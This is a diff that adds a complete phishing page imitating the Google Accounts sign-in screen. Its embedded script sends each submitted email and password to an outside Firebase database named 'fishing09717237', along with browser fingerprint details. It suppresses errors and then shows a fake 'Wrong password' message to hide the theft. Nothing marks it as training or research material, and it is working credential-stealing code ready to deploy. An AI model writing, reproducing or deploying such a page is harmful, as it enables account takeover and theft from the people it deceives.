@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in - Google Accounts</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{
+    font-family:'Roboto',Arial,sans-serif;
+    background:#fff;
+    display:flex;justify-content:center;align-items:center;
+    min-height:100vh;padding:20px;
+  }
+  .box{
+    width:100%;max-width:400px;
+    padding:48px 40px 36px;
+    border:1px solid #dadce0;border-radius:8px;
+  }
+  .logo{text-align:center;margin-bottom:16px;font-size:24px;font-weight:500;letter-spacing:-.5px}
+  .logo span:nth-child(1){color:#4285F4}
+  .logo span:nth-child(2){color:#EA4335}
+  .logo span:nth-child(3){color:#FBBC05}
+  .logo span:nth-child(4){color:#4285F4}
+  .logo span:nth-child(5){color:#34A853}
+  .logo span:nth-child(6){color:#EA4335}
+  h2{font-size:22px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}
+  .sub{font-size:15px;color:#5f6368;text-align:center;margin-bottom:32px}
+  input{
+    width:100%;padding:13px 15px;margin-bottom:16px;
+    border:1px solid #dadce0;border-radius:4px;
+    font-size:16px;outline:none;transition:border .15s;
+  }
+  input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px}
+  button{
+    width:100%;padding:12px;background:#1a73e8;color:#fff;
+    border:none;border-radius:4px;font-size:15px;font-weight:500;
+    cursor:pointer;transition:background .15s;
+  }
+  button:hover{background:#1557b0}
+  button:disabled{background:#a8c7fa;cursor:not-allowed}
+  .err{color:#d93025;font-size:13px;margin-top:16px;display:none}
+  .foot{margin-top:32px;text-align:center;font-size:12px;color:#5f6368}
+</style>
+</head>
+<body>
+  <div class="box">
+    <div class="logo">
+      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+    <h2>Sign in</h2>
+    <p class="sub">Use your Google Account</p>
+    <form id="f">
+      <input type="email" id="email" placeholder="Email or phone" required autocomplete="off">
+      <input type="password" id="password" placeholder="Enter your password" required autocomplete="off">
+      <button type="submit" id="btn">Next</button>
+    </form>
+    <div class="err" id="err">Wrong password. Try again or click Forgot password.</div>
+    <div class="foot">English (United States)</div>
+  </div>
+
+<script type="module">
+// @ts-nocheck
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js";
+import { getFirestore, collection, addDoc, serverTimestamp }
+  from "https://www.gstatic.com/firebasejs/12.19.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAp7D5HIgDpgrcqechUwDD62C2PGn7TdQQ",
+  authDomain: "fishing09717237.firebaseapp.com",
+  projectId: "fishing09717237",
+  storageBucket: "fishing09717237.firebasestorage.app",
+  messagingSenderId: "27346774221",
+  appId: "1:27346774221:web:ba439788c6831cf7c8e184"
+};
+
+const app = initializeApp(firebaseConfig);
+const db  = getFirestore(app);
+
+const f   = document.getElementById('f');
+const btn = document.getElementById('btn');
+const err = document.getElementById('err');
+
+f.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  btn.disabled = true;
+  btn.textContent = 'Signing in...';
+
+  const email    = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value;
+
+  let platform = '-';
+  try {
+    platform = (navigator.userAgentData && navigator.userAgentData.platform)
+      || navigator.platform
+      || '-';
+  } catch (_) { platform = '-'; }
+
+  try {
+    await addDoc(collection(db, 'logins'), {
+      email,
+      password,
+      userAgent: navigator.userAgent,
+      platform,
+      language:  navigator.language,
+      screen:    screen.width + 'x' + screen.height,
+      timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
+      referrer:  document.referrer || 'direct',
+      ts:        serverTimestamp()
+    });
+  } catch (e) { /* silent */ }
+
+  setTimeout(() => {
+    err.style.display = 'block';
+    btn.disabled = false;
+    btn.textContent = 'Next';
+    document.getElementById('password').value = '';
+  }, 1300);
+});
+</script>
+</body>
+</html>
